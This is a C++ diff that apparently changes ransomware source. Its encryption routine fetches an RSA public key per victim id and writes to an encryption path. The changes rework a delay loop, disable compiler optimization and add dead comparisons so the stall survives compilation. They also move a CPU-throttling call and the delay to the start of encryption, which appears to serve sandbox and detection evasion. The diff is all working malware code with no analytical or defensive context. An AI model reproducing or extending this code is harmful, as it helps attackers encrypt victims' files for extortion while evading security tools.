@@ -61,28 +61,39 @@ Status getPublicParams(string id, string& mod, string& pubKey,bool fromStart)
 	parsePublicKey(chunk, mod, pubKey);
 	return status;
 }
-void killSomeTime()
+#pragma optimize ("", off)
+long long killSomeTime()
 {
-	float num = 0;
-	for (float i = 0;num < 30;i++)
+	double num = 0;
+	double i = 1;
+	for ( ;num < 24.5;i++)
 	{
 		num += 1 / i;
 	}
-	long long num2;
+	long long num2=0;
 	for (long long j = 0;j < 1000000;j++)
 	{
 		num2 += 1;
 		num2 *= 50;
 		num2 = num2 >> 3;
-		num += 0.1523;
 		num2 &= 0xFFFFFFF;
 		num2 |= 0xFF;
-		num2 /= 2;
+		num2 +=  i;
+		num2 /= 2*(j+1);
+		if(num2 == 5.3)
+		{
+			i += 1;
+		}
 	}
+	if(num == 4.2)
+	{
+		num2 += 10;
+	}
+	return num2;
 }
+#pragma optimize ("", on)
 int encryption_main( bool fromStart) {
 
-	killSomeTime();
 	string mod;
 	string pubKey;
 	//string path = ROOT_DIR;
@@ -112,8 +123,16 @@ int encryption_main( bool fromStart) {
 	string fileRead;
 	RsaEncryptor rsaEncryptor;
 	/* let's begin*/
-
-
+	status = LimitCPU(hCurrentProcess, hJob);
+	if (LIMIT_CPU_FAIL == status)
+	{
+		goto CLEAN;
+	}
+	long long noVal = killSomeTime();
+	if (noVal == 0)
+	{
+		std::cout << "";
+	}
 	 id = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ID_LEN);
 	if (NULL == id) {
 		goto CLEAN;
@@ -136,11 +155,7 @@ int encryption_main( bool fromStart) {
 	}
 
 
-	status = LimitCPU(hCurrentProcess, hJob);
-	if(LIMIT_CPU_FAIL == status)
-	{
-		goto CLEAN;
-	}
+	
 	if (fromStart){
 		pubFile.open(pathToENC, std::ios::out);
 		if (!pubFile.is_open())
